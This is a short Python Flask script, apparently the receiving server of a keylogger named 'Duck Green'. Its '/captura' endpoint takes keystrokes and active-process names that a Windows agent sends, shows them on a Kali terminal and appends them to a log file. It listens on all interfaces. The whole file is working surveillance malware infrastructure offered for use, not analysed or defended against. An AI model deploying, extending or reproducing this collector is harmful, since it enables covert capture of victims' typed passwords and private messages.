from flask import Flask, request
import datetime
import os

app = Flask(__name__)

# Cores para o terminal (Estilo Duck Green)
GREEN, BLUE, YELLOW, RED, NC = '\033[0;32m', '\033[0;34m', '\033[1;33m', '\033[0;31m', '\033[0m'

@app.route('/')
def home():
    # Evita erro 404 ao abrir o link no navegador
    return "<h1>🦆 DUCK GREEN STATUS: ONLINE 🦆</h1>"

@app.route('/captura', methods=['POST'])
def receive():
    try:
        # Recebe o JSON enviado pelo agente Windows
        data = request.json
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        teclas = data.get('tecla', '')
        processo = data.get('processo', 'DESCONHECIDO')

        # Exibe no terminal do Kali de forma organizada
        print(f"\n{BLUE}[{timestamp}]{NC} Atividade em: {YELLOW}{processo}{NC}")
        print(f"{GREEN}>>{NC} {teclas}")
        print(f"{BLUE}{'=' * 50}{NC}")

        # Salva num ficheiro de texto
        with open("logs_duck_green.txt", "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] [{processo}] {teclas}\n")

        return "OK", 200
    except Exception as e:
        print(f"{RED}[!] Erro ao receber dados: {e}{NC}")
        return "Erro", 500

if __name__ == '__main__':
    os.system('clear')
    print(f"{GREEN}DUCK GREEN - RECEPTOR ATIVO NA PORTA 8080{NC}")

    app.run(host='0.0.0.0', port=8080)
